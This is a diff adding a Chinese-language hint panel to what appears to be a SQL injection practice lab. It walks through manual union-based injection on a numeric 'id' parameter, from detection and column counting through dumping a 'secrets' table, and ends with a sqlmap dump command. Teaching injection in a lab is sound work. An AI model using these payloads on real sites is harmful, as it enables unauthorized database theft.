@@ -1,0 +1,18 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>GET 型注入的经典流程：① 判断注入类型（数字型还是字符型）；② 用 <code>order by</code> 猜字段数；③ 用 <code>union select</code> 找显示位；④ 依次爆库、爆表、爆列、拿数据。本关参数 <code>id</code> 是数字型，没有引号包裹，直接拼接 <code>and 1=1</code> 即可判断。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>手工注入步骤：</b><br>
+1. 判断注入：<code>?id=1 and 1=1</code> 正常，<code>?id=1 and 1=2</code> 异常 &rarr; 数字型注入<br>
+2. 猜字段数：<code>?id=1 order by 4</code> 正常，<code>order by 5</code> 报错 &rarr; 4列<br>
+3. 找显示位：<code>?id=-1 union select 1,2,3,4</code><br>
+4. 爆库：<code>?id=-1 union select 1,database(),user(),version()</code><br>
+5. 爆表：<code>?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</code><br>
+6. 爆列：<code>?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='secrets'</code><br>
+7. 拿通关凭证：<code>?id=-1 union select 1,group_concat(secret),3,4 from secrets</code><br>
+<b>sqlmap：</b><code>sqlmap -u "{{SITE}}/modules/sqli/get.php?id=1" -D bafanglab -T secrets --dump --batch</code>
+</div>
+</details>
